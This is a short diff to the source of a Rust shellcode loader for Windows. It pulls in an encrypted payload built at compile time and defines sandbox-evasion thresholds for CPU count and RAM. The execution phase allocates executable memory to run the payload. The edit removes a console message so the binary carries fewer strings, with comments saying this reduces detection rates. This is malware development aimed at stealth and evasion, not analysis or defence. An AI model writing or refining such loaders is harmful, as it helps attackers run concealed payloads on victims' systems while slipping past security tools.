@@ -17,7 +17,7 @@ use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, I
 // Payload Data
 include!(concat!(env!("OUT_DIR"), "/payload_data.rs")); // build.rs generates this file because we need to keep the key/nonce secret
 
-// --- Phase 0: Evasion Constants ---
+/// --- Phase 0: Evasion Constants ---
 const MIN_CPUS: usize = 4; 
 const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024; // 4 GB
 
@@ -76,11 +76,7 @@ fn main() {
         Err(_) => process::exit(1),
     };
 
-    // REMOVED for Stealth: 
-    // println!("[+] Stealth Mode active. Payload decrypted..."); 
-    // Keeping strings out of the binary reduces detection rates.
-    // --- Phase 3: Simple Execution ---
-    
+    /// --- Phase 2: Simple Execution ---    
     unsafe {
         // 1. Allocate Memory
         // We request executable memory from the Windows OS.
